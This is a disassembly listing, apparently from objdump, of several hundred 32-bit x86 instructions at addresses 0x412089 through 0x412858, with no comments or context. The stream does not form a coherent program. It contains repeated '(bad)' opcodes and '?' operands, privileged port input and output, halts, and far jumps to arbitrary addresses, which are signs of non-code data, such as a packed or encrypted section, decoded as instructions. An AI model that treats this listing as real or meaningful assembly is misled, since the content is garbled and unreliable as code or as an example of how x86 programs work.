  412089:	cs mov bh,0x98
  41208c:	mov    ch,0xa9
  41208e:	push   edi
  41208f:	shl    BYTE PTR [edx],0xcc
  412092:	adc    eax,0x4034c4c
  412097:	loope  0x41204a
  412099:	repz pop edx
  41209b:	xor    esi,DWORD PTR [ebp+ecx*2-0x74eeca94]
  4120a2:	add    al,0x50
  4120a4:	test   eax,0x56513064
  4120a9:	hlt    
  4120aa:	dec    ecx
  4120ab:	enter  0x1837,0x46
  4120af:	arpl   ax,sp
  4120b1:	mov    al,0x8f
  4120b3:	mov    bh,0xf8
  4120b5:	push   edx
  4120b6:	rcl    BYTE PTR [eax],0xd7
  4120b9:	out    dx,al
  4120ba:	sub    DWORD PTR [esi],0x54739e17
  4120c0:	mov    al,0x47
  4120c2:	and    BYTE PTR [ebx-0xe5a05e9],bh
  4120c8:	leave  
  4120c9:	xlat   BYTE PTR ds:[ebx]
  4120ca:	mov    ah,BYTE PTR [edx+0x8]
  4120cd:	lods   eax,DWORD PTR ds:[esi]
  4120ce:	inc    ebx
  4120cf:	cmp    dh,BYTE PTR [esi+edi*4+0x548c9e8d]
  4120d6:	std    
  4120d7:	enter  0x1915,0x8c
  4120db:	xchg   esi,eax
  4120dc:	dec    esp
  4120dd:	outs   dx,DWORD PTR ds:[esi]
  4120de:	dec    ecx
  4120df:	gs sbb eax,0x69236c53
  4120e5:	mov    ah,0x21
  4120e7:	test   DWORD PTR [edi+0x55],ebp
  4120ea:	add    DWORD PTR [edx+0x5abf197c],eax
  4120f0:	xor    dl,BYTE PTR [eax+0x883016b]
  4120f6:	popa   
  4120f7:	mov    BYTE PTR [esi+eiz*4-0x7620d25e],bh
  4120fe:	cdq    
  4120ff:	mov    dh,0x16
  412101:	rcr    BYTE PTR [ecx],cl
  412103:	mov    ds:0xacd02a0f,eax
  412108:	cli    
  412109:	pop    edx
  41210a:	push   ebp
  41210b:	mov    DWORD PTR ds:0xb9e594df,eax
  412111:	nop
  412112:	arpl   bp,cx
  412114:	mov    ebx,0x20892ca6
  412119:	mov    ss,WORD PTR [edx]
  41211b:	push   ebx
  41211c:	les    ecx,FWORD PTR [ebx+ebp*2+0x7d]
  412120:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412121:	xor    eax,DWORD PTR [ebx]
  412123:	inc    ecx
  412124:	adc    DWORD PTR [eax],edi
  412126:	in     eax,dx
  412127:	das    
  412128:	stos   BYTE PTR es:[edi],al
  412129:	jl     0x412138
  41212b:	aas    
  41212c:	sub    DWORD PTR [ebx],edx
  41212e:	jae    0x4120e6
  412130:	enter  0x4d9e,0xc3
  412134:	sbb    eax,0xb5174d71
  412139:	xor    eax,0x6068d68f
  41213e:	test   edi,0x19bf1960
  412144:	shl    DWORD PTR [ebp+0x7ced4246],1
  41214a:	inc    esp
  41214b:	out    0x2a,al
  41214d:	shl    BYTE PTR [esi-0x1d2929a8],cl
  412153:	inc    ebx
  412154:	xor    esp,DWORD PTR [edx+0x1ba0bdc4]
  41215a:	mov    ebx,DWORD PTR [edi-0x1f20fba5]
  412160:	not    BYTE PTR [ebp+0x35]
  412163:	and    eax,DWORD PTR [edx+0x32fe79a9]
  412169:	jmp    0xf0da:0x993a6391
  412170:	inc    esi
  412171:	mov    ebp,0x96ab400
  412176:	add    edx,DWORD PTR [esi-0x2391df85]
  41217c:	in     eax,0xb2
  41217e:	cmp    DWORD PTR [esp+ecx*1],ecx
  412181:	push   cs
  412182:	push   ecx
  412183:	jb     0x4121e4
  412185:	cmp    DWORD PTR [ecx-0x6],ebp
  412188:	pop    ebp
  412189:	outs   dx,BYTE PTR ds:[esi]
  41218a:	inc    eax
  41218b:	clc    
  41218c:	stos   DWORD PTR es:[edi],eax
  41218d:	(bad)  
  41218e:	push   esp
  41218f:	and    ah,BYTE PTR [esi+0x3141041e]
  412195:	cmp    BYTE PTR [eax-0x44],cl
  412198:	cmc    
  412199:	fcomp  DWORD PTR [edi]
  41219b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41219c:	sbb    eax,0xbd480ffe
  4121a1:	rol    ecx,0xbd
  4121a4:	retf   
  4121a5:	fcom   QWORD PTR [edx+0x59]
  4121a8:	retf   0xed03
  4121ab:	mov    ebx,0x2ce0a733
  4121b0:	cmovbe esp,DWORD PTR [edi]
  4121b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121b4:	add    DWORD PTR [edi+eax*8-0x75],0x4
  4121b9:	cwde   
  4121ba:	inc    esi
  4121bb:	jle    0x412197
  4121bd:	mov    al,0x99
  4121bf:	lods   eax,DWORD PTR ds:[esi]
  4121c0:	int3   
  4121c1:	sti    
  4121c2:	sti    
  4121c3:	js     0x412215
  4121c5:	mov    ebx,0x1f9f9985
  4121ca:	xor    bl,bh
  4121cc:	jbe    0x412182
  4121ce:	mov    edi,edx
  4121d0:	mov    dl,0x45
  4121d2:	sbb    BYTE PTR [ebx-0x7b3c6cc2],ah
  4121d8:	imul   ebp,DWORD PTR [ecx],0x37
  4121db:	push   ss
  4121dc:	xchg   ebx,eax
  4121dd:	cwde   
  4121de:	mov    ebp,ebx
  4121e0:	aam    0xe2
  4121e2:	jbe    0x41224f
  4121e4:	fstp   TBYTE PTR [ecx-0x22]
  4121e7:	sbb    al,0xb5
  4121e9:	dec    eax
  4121ea:	mov    bl,0xaa
  4121ec:	ficom  WORD PTR [edx]
  4121ee:	shl    BYTE PTR [ecx+0x3d87ef51],0x99
  4121f5:	in     al,dx
  4121f6:	out    0xa7,al
  4121f8:	xor    DWORD PTR [edi-0x1a],esp
  4121fb:	add    al,0xcf
  4121fd:	jecxz  0x4121bd
  4121ff:	dec    esp
  412200:	push   ds
  412201:	dec    edi
  412202:	sbb    DWORD PTR [edx],ebx
  412204:	fsubr  DWORD PTR fs:[eax+0x3d]
  412208:	push   edi
  412209:	jae    0x4121a7
  41220b:	popa   
  41220c:	sar    BYTE PTR [edi+0x18f8a3ec],cl
  412212:	nop
  412213:	or     bh,al
  412215:	xor    ebx,0xcb2af4ed
  41221b:	ror    DWORD PTR [ecx+ebp*4-0x55c22a3b],cl
  412222:	into   
  412223:	lods   eax,DWORD PTR ds:[esi]
  412224:	xchg   DWORD PTR [esp+edi*4],eax
  412227:	je     0x412204
  412229:	or     BYTE PTR [eax+edi*4-0x13aa94dd],bl
  412230:	test   al,0x82
  412232:	pop    ecx
  412233:	fiadd  WORD PTR [ecx]
  412235:	jbe    0x41221e
  412237:	ins    BYTE PTR es:[edi],dx
  412238:	sub    BYTE PTR [esi+0x5df3d0ff],dl
  41223e:	add    eax,0x1c11c810
  412243:	dec    edx
  412244:	and    ecx,DWORD PTR [edx]
  412246:	mul    DWORD PTR [esi+0x28]
  412249:	dec    eax
  41224a:	jns    0x412288
  41224c:	sub    edi,ecx
  41224e:	push   0x8c9719d6
  412253:	jle    0x412255
  412255:	ja     0x412220
  412257:	outs   dx,BYTE PTR ds:[esi]
  412258:	in     al,0xf3
  41225a:	es gs xchg esp,eax
  41225d:	jo     0x41225d
  41225f:	test   eax,0xfaa044c
  412264:	leave  
  412265:	and    DWORD PTR [esi+0x7f700a0e],edx
  41226b:	sbb    DWORD PTR [eax],esi
  41226d:	imul   edi,DWORD PTR [ebp-0x503c0d84],0x5e
  412274:	mov    WORD PTR [eax+0x7ec45475],ds
  41227a:	mov    ecx,0x44974518
  41227f:	cs cmp dh,dh
  412282:	rol    DWORD PTR [eax+0x4f374156],1
  412288:	cwde   
  412289:	in     eax,0xb4
  41228b:	mov    edi,0x54077a96
  412290:	jns    0x412250
  412292:	cdq    
  412293:	lods   al,BYTE PTR ds:[esi]
  412294:	std    
  412295:	enter  0xc9b3,0x60
  412299:	push   ds
  41229a:	(bad)  
  41229b:	mov    dl,0xbf
  41229d:	scas   al,BYTE PTR es:[edi]
  41229e:	add    eax,0x5f687900
  4122a3:	imul   BYTE PTR ds:0xdf3d4ffd
  4122a9:	and    DWORD PTR [edi-0x27233002],0xffffffaf
  4122b0:	xchg   ebp,eax
  4122b1:	sbb    cl,BYTE PTR [edx-0x7f]
  4122b4:	xchg   edi,eax
  4122b5:	test   BYTE PTR [eax],dh
  4122b7:	iret   
  4122b8:	mov    dl,0x4b
  4122ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122bb:	inc    eax
  4122bc:	sar    DWORD PTR [edi+0x4e1297ae],1
  4122c2:	rcl    BYTE PTR [ebx],cl
  4122c4:	push   es
  4122c5:	fucomip st,st(1)
  4122c7:	in     al,dx
  4122c8:	inc    ebp
  4122c9:	push   ss
  4122ca:	jl     0x41226f
  4122cc:	ins    DWORD PTR es:[edi],dx
  4122cd:	cmp    ecx,ebx
  4122cf:	ror    BYTE PTR [ebx],0xc6
  4122d2:	cli    
  4122d3:	mov    DWORD PTR [edx+0x4e],0x7e49aa9e
  4122da:	addr16 fwait
  4122dc:	add    al,BYTE PTR [eax]
  4122de:	pushf  
  4122df:	jle    0x4122ad
  4122e1:	xor    ah,BYTE PTR [edx+0x154f8acf]
  4122e7:	jecxz  0x4122c3
  4122e9:	ret    0x77f6
  4122ec:	nop
  4122ed:	or     eax,0x54ae5d4f
  4122f2:	in     eax,0x19
  4122f4:	scas   al,BYTE PTR es:[edi]
  4122f5:	add    eax,0xc369cbd0
  4122fa:	inc    ebp
  4122fb:	lods   eax,DWORD PTR cs:[esi]
  4122fd:	cmp    al,0x53
  4122ff:	push   0x2d54a01d
  412304:	or     bh,ch
  412306:	clc    
  412307:	cmp    al,0x45
  412309:	inc    edx
  41230a:	pop    ds
  41230b:	mov    ebx,0x1e59b825
  412310:	pop    ecx
  412311:	xchg   edi,eax
  412312:	repnz or dh,BYTE PTR ds:0x76761312
  412319:	pop    esi
  41231a:	ror    BYTE PTR [eax],0xbb
  41231d:	or     esi,edi
  41231f:	sahf   
  412320:	out    0x4b,al
  412322:	sbb    DWORD PTR [ebp+0x2b],ebp
  412325:	lea    ebx,[esi+eax*1+0x7c]
  412329:	or     DWORD PTR [ebx],ebp
  41232b:	je     0x412318
  41232d:	cdq    
  41232e:	pop    es
  41232f:	scas   al,BYTE PTR es:[edi]
  412330:	cmp    DWORD PTR [ebx+esi*8-0x27],eax
  412334:	daa    
  412335:	or     DWORD PTR [eax],esp
  412337:	inc    esi
  412338:	sub    dl,BYTE PTR [esi+0x70e233e1]
  41233e:	mov    esp,0xf7612db9
  412343:	ja     0x41231f
  412345:	mov    edx,0x8d94943b
  41234a:	xchg   DWORD PTR [eax-0x576d0984],ebp
  412350:	cmp    DWORD PTR [esp+ebp*2-0x16],esp
  412354:	mov    ebp,0x8ea8a3a3
  412359:	pop    ds
  41235a:	push   esp
  41235b:	adc    bl,ah
  41235d:	loopne 0x4123de
  41235f:	mov    bh,BYTE PTR [edi+esi*8+0x36]
  412363:	ins    BYTE PTR es:[edi],dx
  412364:	fidivr WORD PTR [edi]
  412366:	xchg   DWORD PTR [ecx],ecx
  412368:	and    BYTE PTR [ebp-0x11a2d4a7],bh
  41236e:	icebp  
  41236f:	jp     0x41239a
  412371:	gs iret 
  412373:	retf   0x4839
  412376:	jo     0x4123ca
  412378:	push   0x789bb515
  41237d:	jmp    0x412300
  41237f:	test   al,0xa2
  412381:	clc    
  412382:	cdq    
  412383:	fdiv   DWORD PTR [esi+0x58eba047]
  412389:	out    dx,eax
  41238a:	add    al,0x2c
  41238c:	(bad)  
  41238d:	popf   
  41238e:	out    0xaf,eax
  412390:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412391:	stc    
  412392:	ficomp WORD PTR [edx]
  412394:	adc    BYTE PTR [esi+0x1],ch
  412397:	jmp    0xc5fd5d7f
  41239c:	icebp  
  41239d:	push   ebp
  41239e:	fiadd  DWORD PTR [edi]
  4123a0:	les    esi,FWORD PTR [edx]
  4123a2:	nop
  4123a3:	in     eax,0xc1
  4123a5:	xchg   ebx,eax
  4123a6:	scas   al,BYTE PTR es:[edi]
  4123a7:	pop    ebx
  4123a8:	push   ecx
  4123a9:	std    
  4123aa:	fs (bad) 
  4123ac:	cmc    
  4123ad:	stos   BYTE PTR es:[edi],al
  4123ae:	imul   DWORD PTR [eax+0xa0e2c25]
  4123b4:	fst    QWORD PTR [ebx-0x5ce03e66]
  4123ba:	or     dl,BYTE PTR [ebx]
  4123bc:	jl     0x4123bf
  4123be:	jl     0x412394
  4123c0:	aaa    
  4123c1:	inc    edx
  4123c2:	cmp    edi,edi
  4123c4:	or     al,0xf
  4123c6:	push   edi
  4123c7:	fucomp st(0)
  4123c9:	mov    BYTE PTR [ebx-0x3f3360f2],0xf9
  4123d0:	int    0x9
  4123d2:	test   bl,al
  4123d4:	hlt    
  4123d5:	in     eax,0xb8
  4123d7:	lds    edx,FWORD PTR [ecx+0x42]
  4123da:	mov    WORD PTR [edx+0x20],?
  4123dd:	test   eax,0x97dc93
  4123e2:	dec    edx
  4123e3:	imul   edx,DWORD PTR [edi+esi*4+0x68],0xfffffff2
  4123e8:	mov    DWORD PTR [ebx+0x47],ecx
  4123eb:	lea    ebp,[ecx]
  4123ed:	adc    eax,0x1d29e280
  4123f2:	gs cmp esi,ebp
  4123f5:	pop    eax
  4123f6:	sub    DWORD PTR [ebp-0x18b8a18d],ebx
  4123fc:	add    BYTE PTR [edi+0x2c2c08f3],0xf1
  412403:	adc    eax,0xa4d2a55d
  412408:	jmp    0x41243f
  41240a:	cld    
  41240b:	ror    ah,1
  41240d:	aas    
  41240e:	lock leave 
  412410:	add    eax,0xbb918e17
  412415:	out    0x3f,al
  412417:	repnz sbb DWORD PTR [ecx+0x7c],ecx
  41241b:	dec    esi
  41241c:	js     0x412472
  41241e:	int3   
  41241f:	mov    al,ds:0x70d1b633
  412424:	fisttp DWORD PTR [ecx+0x6c]
  412427:	inc    esp
  412428:	and    eax,0x5a6c0b44
  41242d:	shr    BYTE PTR [eax+0x5f],1
  412430:	pop    ecx
  412431:	cmp    al,0x30
  412433:	mov    esi,0xd7da7837
  412438:	mov    ebx,0xdaa26353
  41243d:	push   DWORD PTR [edi+ecx*4+0xda1cf34]
  412444:	lds    esp,FWORD PTR [ebx-0x2a1c4394]
  41244a:	xchg   ecx,eax
  41244b:	push   esi
  41244c:	inc    esi
  41244d:	inc    edx
  41244e:	cld    
  41244f:	push   esp
  412450:	mov    ds:0xe5283af8,al
  412455:	sub    DWORD PTR [ebx+ecx*4],ebp
  412458:	xor    al,0x8e
  41245a:	gs int3 
  41245c:	pop    edx
  41245d:	add    eax,0x4753530a
  412462:	dec    edx
  412463:	jp     0x412410
  412465:	fdivr  st,st(0)
  412467:	sub    DWORD PTR [edi+ecx*2],edx
  41246a:	sbb    al,0xb
  41246c:	jle    0x4124de
  41246e:	cmp    ch,BYTE PTR [edx-0x572f358e]
  412474:	arpl   WORD PTR [ebp-0x1d8b1ace],cx
  41247a:	mov    edx,0x9a324b11
  41247f:	and    eax,0xbf1d6a9
  412484:	rcl    dl,cl
  412486:	idiv   BYTE PTR [ebx]
  412488:	sbb    al,0x46
  41248a:	das    
  41248b:	jnp    0x412481
  41248d:	gs push esi
  41248f:	hlt    
  412490:	xchg   edi,eax
  412491:	mov    eax,ds:0xa17d95ed
  412496:	test   al,0xd3
  412498:	les    edi,FWORD PTR [ebx-0x6653f552]
  41249e:	sub    DWORD PTR [esi+ecx*8],edx
  4124a1:	sbb    dl,BYTE PTR [eax]
  4124a3:	mov    edx,0x8ef91235
  4124a8:	mov    edi,0xb36c8c29
  4124ad:	(bad)  
  4124ae:	je     0x412451
  4124b0:	inc    eax
  4124b1:	fwait
  4124b2:	fwait
  4124b3:	repnz pop edi
  4124b5:	sub    edx,ebx
  4124b7:	or     DWORD PTR [edx+0x57],esp
  4124ba:	aad    0xa4
  4124bc:	into   
  4124bd:	fidivr WORD PTR [ebx-0x36]
  4124c0:	fstp   TBYTE PTR [esi-0x72]
  4124c3:	inc    eax
  4124c4:	push   ss
  4124c5:	dec    eax
  4124c6:	fwait
  4124c7:	jl     0x412467
  4124c9:	lea    ebx,[edx]
  4124cb:	and    al,0xfa
  4124cd:	stos   DWORD PTR es:[edi],eax
  4124ce:	mul    DWORD PTR [edx+0x1135b68b]
  4124d4:	or     edx,edx
  4124d6:	sub    dh,ch
  4124d8:	jecxz  0x412466
  4124da:	hlt    
  4124db:	mov    BYTE PTR [ecx],bl
  4124dd:	fcomp  QWORD PTR [edx]
  4124df:	jmp    0x32ce415d
  4124e4:	push   cs
  4124e5:	mov    ch,0xc4
  4124e7:	pop    ecx
  4124e8:	add    esp,DWORD PTR [ecx-0x6285f7ca]
  4124ee:	jmp    0xd12a:0xcc330125
  4124f5:	push   edi
  4124f6:	js     0x41249b
  4124f8:	jbe    0x412511
  4124fa:	jmp    0x4124c6
  4124fc:	lods   eax,DWORD PTR ds:[esi]
  4124fd:	std    
  4124fe:	stos   BYTE PTR es:[edi],al
  4124ff:	sbb    al,0x28
  412501:	clc    
  412502:	add    ebx,DWORD PTR [ebx-0x19bf2810]
  412508:	sbb    edi,DWORD PTR [esi]
  41250a:	out    0xb3,al
  41250c:	cs sti 
  41250e:	push   eax
  41250f:	cmp    eax,DWORD PTR [ebx]
  412511:	pop    ds
  412512:	xchg   ebp,eax
  412513:	sbb    dl,BYTE PTR [edx]
  412515:	daa    
  412516:	pop    ebp
  412517:	mov    WORD PTR [eax+0xae7c2b5],?
  41251d:	or     BYTE PTR [edi+0x7a],0x61
  412521:	and    al,0xf
  412523:	mov    edi,0x4496cb96
  412528:	std    
  412529:	(bad)  
  41252a:	fnstcw WORD PTR [edi-0x6d]
  41252d:	sub    ebx,DWORD PTR ds:0x7aa4ec69
  412533:	and    eax,0x22310616
  412538:	xchg   ebx,eax
  412539:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41253a:	jnp    0x41252d
  41253c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41253d:	aas    
  41253e:	std    
  41253f:	pop    edx
  412540:	sbb    BYTE PTR [edx],dh
  412542:	adc    BYTE PTR [esi],0x67
  412545:	pop    ebp
  412546:	rcl    DWORD PTR [ebp-0x3cd7923],cl
  41254c:	cld    
  41254d:	xor    esp,DWORD PTR [ecx+ebp*4-0x3dc3ae40]
  412554:	shrd   DWORD PTR [eax],ebp,cl
  412557:	lds    esi,FWORD PTR [ebx+eiz*1-0x6b]
  41255b:	fcomp  DWORD PTR [edx+0x53]
  41255e:	pop    edx
  41255f:	fcomp  QWORD PTR [edi-0x13600940]
  412565:	scas   al,BYTE PTR es:[edi]
  412566:	and    al,0x80
  412568:	mov    esp,0x6000db85
  41256d:	pushf  
  41256e:	cmp    BYTE PTR [esi+0x79],bh
  412571:	into   
  412572:	clc    
  412573:	xchg   esi,eax
  412574:	(bad)  
  412575:	add    al,0x25
  412577:	ficom  WORD PTR [ecx-0x45]
  41257a:	not    DWORD PTR [edi+0x361690ad]
  412580:	pop    ss
  412581:	mov    dl,0xa8
  412583:	std    
  412584:	in     al,dx
  412585:	jecxz  0x4125b6
  412587:	mov    cl,0x6e
  412589:	xchg   esi,eax
  41258a:	mov    ebp,0xc28f9310
  41258f:	push   ebx
  412590:	mov    ch,0xbd
  412592:	sbb    ah,BYTE PTR [esi]
  412594:	js     0x412585
  412596:	lods   eax,DWORD PTR ds:[esi]
  412597:	into   
  412598:	push   es
  412599:	in     eax,dx
  41259a:	adc    ecx,esp
  41259c:	mov    ah,0xf9
  41259e:	mov    ch,0x6e
  4125a0:	sahf   
  4125a1:	scas   al,BYTE PTR es:[edi]
  4125a2:	cmp    al,0x5d
  4125a4:	mov    ah,0x8d
  4125a6:	cs pop esp
  4125a8:	arpl   si,dx
  4125aa:	inc    ebp
  4125ab:	add    ebx,DWORD PTR [ebx]
  4125ad:	dec    esi
  4125ae:	bts    ebp,esi
  4125b1:	jl     0x41256b
  4125b3:	mov    DWORD PTR [ebp-0x384c3ceb],esp
  4125b9:	xchg   ebp,eax
  4125ba:	fisub  WORD PTR [ecx+ebx*2-0x4f43a79e]
  4125c1:	add    eax,0xb1ea6de5
  4125c6:	test   DWORD PTR [ecx-0x648810fc],esp
  4125cc:	mov    cl,0x1f
  4125ce:	ins    BYTE PTR es:[edi],dx
  4125cf:	or     eax,0x4f1cf3e4
  4125d4:	cmp    ebp,ebp
  4125d6:	sbb    ch,cl
  4125d8:	jbe    0x4125c0
  4125da:	lds    edx,FWORD PTR [ecx-0x39]
  4125dd:	add    BYTE PTR [edi],dl
  4125df:	loop   0x41264e
  4125e1:	jp     0x4125e2
  4125e3:	jmp    0x603f:0x9092fc56
  4125ea:	inc    esp
  4125eb:	push   ebx
  4125ec:	jnp    0x4125ce
  4125ee:	out    dx,eax
  4125ef:	ror    DWORD PTR [edi-0x53],cl
  4125f2:	xchg   ebx,eax
  4125f3:	fldlg2 
  4125f5:	xor    BYTE PTR [edx-0x367c7966],dh
  4125fb:	inc    ebp
  4125fc:	jae    0x4125b0
  4125fe:	into   
  4125ff:	imul   DWORD PTR [esi+0x12e67152]
  412605:	in     eax,0xde
  412607:	cmp    DWORD PTR [esi+ebp*8],ecx
  41260a:	inc    edx
  41260b:	into   
  41260c:	mov    ah,0xa5
  41260e:	fs and al,0xed
  412611:	test   eax,0xcc37880
  412616:	xchg   DWORD PTR [edx],eax
  412618:	xchg   esi,eax
  412619:	les    ebp,FWORD PTR [ecx+0x58e00f5a]
  41261f:	out    0x9b,ax
  412622:	sbb    BYTE PTR [esp+edi*1-0x4a],al
  412626:	dec    eax
  412627:	xchg   ebx,eax
  412628:	stc    
  412629:	cmp    DWORD PTR [ecx+ebp*2],esi
  41262c:	ficom  DWORD PTR [ecx]
  41262e:	(bad)  
  41262f:	push   esi
  412630:	and    BYTE PTR [ebx+0x73],ah
  412633:	xor    DWORD PTR [edi-0x399d905c],0xffffffb1
  41263a:	inc    edi
  41263b:	test   BYTE PTR [edx+0x3b5f4ea2],0x93
  412642:	push   ecx
  412643:	mov    al,ds:0x67e6e046
  412648:	mov    ch,0x43
  41264a:	in     al,dx
  41264b:	(bad)  
  41264c:	cli    
  41264d:	jb     0x4125ef
  41264f:	cmovg  esi,DWORD PTR [ebp+ecx*8+0x6a]
  412654:	jmp    0x41268a
  412656:	daa    
  412657:	jmp    0xf82c:0x21c07d2e
  41265e:	lods   eax,DWORD PTR ds:[esi]
  41265f:	adc    BYTE PTR [ebp-0x437dec10],bl
  412665:	cmp    al,0xb9
  412667:	sbb    eax,esp
  412669:	cs xchg ebp,eax
  41266b:	das    
  41266c:	and    ebx,ecx
  41266e:	adc    bh,BYTE PTR ds:0x4ccc3e80
  412674:	push   ecx
  412675:	and    al,0xda
  412677:	pop    edi
  412679:	xlat   BYTE PTR ds:[ebx]
  41267a:	leave  
  41267b:	adc    eax,edx
  41267d:	cs jg  0x412608
  412680:	push   es
  412681:	imul   ebx,edi,0x46
  412684:	fsub   QWORD PTR [edi-0x66]
  412687:	dec    edi
  412688:	in     eax,0xe5
  41268a:	ror    BYTE PTR [edx*1+0x7ec133b9],cl
  412691:	xlat   BYTE PTR ds:[ebx]
  412692:	or     BYTE PTR [esi],0xa4
  412695:	sub    bh,ah
  412697:	mov    ds:0x6256ed30,eax
  41269c:	shl    BYTE PTR [edi+0xa441c4e],1
  4126a2:	mov    WORD PTR [esi+0x4a],ss
  4126a5:	jecxz  0x412722
  4126a7:	out    0x1f,al
  4126a9:	adc    DWORD PTR ds:0x6b043a7c,esi
  4126af:	sbb    esi,DWORD PTR [eax-0x46]
  4126b2:	psllq  mm6,QWORD PTR [ecx-0x4d1a725e]
  4126b9:	adc    ebp,DWORD PTR [ecx]
  4126bb:	sub    BYTE PTR [ecx+0x2d],ch
  4126be:	push   edx
  4126bf:	rol    BYTE PTR [edx-0x8cde49e],0x56
  4126c6:	stos   BYTE PTR es:[edi],al
  4126c7:	jmp    0xb4e286f3
  4126cc:	or     DWORD PTR [ebp-0x69],0x18
  4126d0:	bsr    ebp,DWORD PTR [edx+0x3f]
  4126d4:	je     0x4126e8
  4126d6:	xchg   edx,eax
  4126d7:	dec    eax
  4126d8:	push   es
  4126d9:	sbb    eax,0xbcc59c6b
  4126de:	xchg   dh,bl
  4126e0:	xor    cl,BYTE PTR [edi-0x5ffd2c8d]
  4126e6:	and    al,0x8e
  4126e8:	cdq    
  4126e9:	jp     0x41272a
  4126eb:	xor    ecx,DWORD PTR [edx+0x49]
  4126ee:	inc    ebx
  4126ef:	retf   
  4126f0:	xchg   edi,eax
  4126f1:	fcom   QWORD PTR [eax-0x1a480289]
  4126f7:	and    dl,cl
  4126f9:	pop    es
  4126fa:	sub    BYTE PTR [eax+ebx*2],bl
  4126fd:	jecxz  0x4126d1
  4126ff:	fwait
  412700:	outs   dx,DWORD PTR ds:[esi]
  412701:	fs cmp eax,0xe45f68f
  412707:	ds and eax,0x18cfbba5
  41270d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41270e:	push   ss
  41270f:	sub    dl,al
  412711:	imul   esi,DWORD PTR [edx+0x30],0x5dcd0cdc
  412718:	jmp    0x41277f
  41271a:	sub    bl,BYTE PTR [edi+0x4225eeba]
  412720:	mov    eax,ds:0xbdbfad35
  412725:	xchg   edi,eax
  412726:	pop    edx
  412727:	int3   
  412728:	xor    eax,0xfabd9ac3
  41272d:	mov    DWORD PTR cs:[edi-0x30],ebx
  412731:	fistp  QWORD PTR [eax]
  412733:	xchg   eax,ebx
  412735:	or     ecx,DWORD PTR [edi+0x609f44a2]
  41273b:	xor    dl,BYTE PTR [eax-0x17]
  41273e:	out    0x37,eax
  412740:	push   ss
  412741:	pushf  
  412742:	jg     0x412705
  412744:	and    eax,0x4bc65315
  412749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41274a:	out    0x48,eax
  41274c:	lods   al,BYTE PTR ds:[esi]
  41274d:	mov    edi,0x5f0e0af9
  412752:	out    0xbe,eax
  412754:	mov    cl,0x94
  412756:	cli    
  412757:	and    BYTE PTR [ebx+0x5725b39e],cl
  41275d:	out    0x59,al
  41275f:	mov    al,0xd4
  412761:	sbb    cl,BYTE PTR [ebp-0x27f4c26]
  412767:	in     eax,dx
  412768:	aad    0x42
  41276a:	mov    dl,0x1c
  41276c:	pusha  
  41276d:	dec    ebp
  41276e:	ins    DWORD PTR es:[edi],dx
  41276f:	sub    al,0x43
  412771:	lahf   
  412772:	push   edx
  412773:	mov    ds:0x29c81004,eax
  412778:	mov    ch,0xa6
  41277a:	pop    ss
  41277b:	(bad)  
  41277c:	push   edi
  41277d:	mov    dl,BYTE PTR [esi+0x10]
  412780:	call   0x4795:0xd5829f46
  412787:	mov    cl,0xb5
  412789:	dec    ecx
  41278a:	loope  0x4127e8
  41278c:	fs mov dh,0x22
  41278f:	aad    0x5f
  412791:	fwait
  412792:	ja     0x4127bf
  412794:	in     al,0xd1
  412796:	jbe    0x412806
  412798:	dec    ebp
  412799:	dec    ebp
  41279a:	repz mov eax,0x5f790cfe
  4127a0:	loopne 0x4127bf
  4127a2:	ins    DWORD PTR es:[edi],dx
  4127a3:	add    bh,BYTE PTR [eax]
  4127a5:	test   DWORD PTR ds:0xe069cf91,ebp
  4127ab:	or     ebx,ebp
  4127ad:	xchg   ecx,eax
  4127ae:	or     ah,dl
  4127b0:	and    dh,dl
  4127b2:	xchg   ecx,eax
  4127b3:	loop   0x4127b6
  4127b5:	adc    dh,BYTE PTR [bx-0x1c]
  4127b9:	aam    0x7a
  4127bb:	lds    eax,FWORD PTR [ebx-0x41]
  4127be:	sub    ecx,ecx
  4127c0:	inc    ebp
  4127c1:	xchg   ebp,eax
  4127c2:	xchg   esp,ecx
  4127c4:	gs lock xchg edi,eax
  4127c7:	jne    0x4127b8
  4127c9:	cld    
  4127ca:	adc    al,bl
  4127cc:	scas   eax,DWORD PTR es:[edi]
  4127cd:	in     eax,dx
  4127ce:	mov    eax,0x44f709ed
  4127d3:	mov    dh,0xa0
  4127d5:	mov    DWORD PTR [edx-0xa],ebp
  4127d8:	push   ss
  4127d9:	daa    
  4127da:	les    ecx,FWORD PTR [ebx+edx*4+0x26bb09f0]
  4127e1:	push   0x9c5702e7
  4127e6:	and    cl,dl
  4127e8:	xchg   ecx,eax
  4127e9:	xchg   edi,eax
  4127ea:	mov    bl,0xfc
  4127ec:	out    0x54,al
  4127ee:	xor    ecx,esp
  4127f0:	fnstsw WORD PTR [ebx]
  4127f2:	sub    esi,edi
  4127f4:	sgdtd  [ebp+0x36]
  4127f8:	cmp    BYTE PTR [esi-0x1],bh
  4127fb:	sub    eax,0xd7083a00
  412800:	pop    edi
  412801:	pop    esi
  412802:	pop    ds
  412803:	cmp    al,0x4a
  412805:	call   0xef72ec2d
  41280a:	mov    ?,WORD PTR [edx+0x28c47020]
  412810:	sbb    ah,cl
  412812:	pop    esp
  412813:	cli    
  412814:	aas    
  412815:	es dec ebx
  412817:	sbb    bl,bl
  412819:	pop    es
  41281a:	test   eax,0x1160523f
  41281f:	adc    eax,0x763b630e
  412824:	cs inc ecx
  412826:	nop
  412827:	xor    BYTE PTR [edx],dl
  412829:	push   edi
  41282a:	adc    DWORD PTR [ecx],eax
  41282c:	cld    
  41282d:	lods   eax,DWORD PTR ds:[esi]
  41282e:	adc    edi,DWORD PTR [eax-0x5b]
  412831:	and    eax,0x4f037f80
  412836:	es pop esi
  412838:	inc    ebp
  412839:	xchg   esi,eax
  41283a:	test   ebp,esp
  41283c:	mov    al,ds:0x491f5cff
  412841:	aam    0x1a
  412843:	je     0x4127f3
  412845:	sbb    al,0x3f
  412847:	inc    cx
  412849:	jge    0x41286d
  41284b:	sti    
  41284c:	jle    0x412867
  41284e:	xchg   ebx,eax
  41284f:	push   0xe35a7eab
  412854:	hlt    
  412855:	add    esp,DWORD PTR [ecx+0x69]
  412858:	lahf   
